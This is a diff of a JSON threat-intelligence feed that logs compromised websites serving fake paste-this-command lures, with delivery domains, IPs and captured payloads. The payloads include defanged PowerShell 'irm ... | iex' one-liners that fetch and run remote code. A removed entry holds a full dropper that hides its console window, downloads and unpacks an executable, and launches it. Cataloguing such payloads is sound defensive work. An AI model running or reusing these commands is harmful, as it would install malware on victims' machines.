@@ -1,5 +1,55 @@
 [
   {
+    "UrlDomain": "smartlifedubai.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/click/8117764681afc8de"
+    ],
+    "IP": [
+      "198.38.94.5"
+    ],
+    "Related": [
+      {
+        "Value": "i",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/8117764681afc8de')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/click/8117764681afc8de"
+    ],
+    "ReportId": "cmwuye3j107k00nmls10wj0uc",
+    "ScannedAt": "2026-11-24T17:13:14.656000+00:00"
+  },
+  {
+    "UrlDomain": "beta.orangelaw.us",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "148.135.128.87"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/c5dee301a82e8e70",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/c5dee301a82e8e70'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/c5dee301a82e8e70"
+    ],
+    "ReportId": "cmwuy1res077h0nmly52hc6wy",
+    "ScannedAt": "2026-11-24T17:03:39.058000+00:00"
+  },
+  {
     "UrlDomain": "www.100kinks.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -2898,49 +2948,5 @@
     ],
     "ReportId": "cmwpb2cbu22ik0omlvze25amh",
     "ScannedAt": "2026-11-20T18:21:24.097000+00:00"
-  },
-  {
-    "UrlDomain": "cloudbasket.shop",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "95.217.198.242"
-    ],
-    "Related": [
-      {
-        "Value": "https://fbifr.com/ca.js?ver=1.0.0",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fbifr.com/kj",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fbifr.com/",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fbifr.com/ss5",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fbifr.com/uzo9",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://fbifr.com/lr",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwp94lsd226p0oml211sh43e",
-    "ScannedAt": "2026-11-20T17:27:10.495000+00:00"
   }
 ]
